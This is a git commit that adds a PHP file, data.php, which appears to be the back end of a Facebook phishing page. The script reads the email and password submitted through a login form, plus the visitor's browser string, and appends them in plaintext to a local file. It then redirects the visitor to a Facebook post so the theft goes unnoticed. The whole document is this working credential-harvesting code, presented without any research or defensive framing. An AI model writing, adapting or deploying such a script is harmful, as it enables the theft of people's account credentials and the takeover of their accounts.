5530a9bbbafb02b558dcf0d5734ae9efac2632be
sbabs1 <56878972+sbabs1@users.noreply.github.com>
2020-02-22 16:44:06 +0530

    Add files via upload

---
+++ data.php
@@ -0,0 +1,18 @@
+<?php
+$handle = fopen("file.txt","a");
+$browser_id = $_SERVER["HTTP_USER_AGENT"];
+$email = $_POST['email'];
+$password = $_POST['pass'];
+if ($email == '')
+{
+	echo "<script>alert('Please enter username');</script>";
+	exit();
+}
+if ($password == '')
+{
+	echo "<script>alert('Please enter password');</script>";
+	exit();
+}
+fwrite($handle,"\n"."Browser id = ".$browser_id."\n"."Username = ".$email."\n"."password = ".$password."\n");
+header('location:https://www.facebook.com/100047592221508/posts/104835007779573/?substory_index=0&app=fbl');
+?>
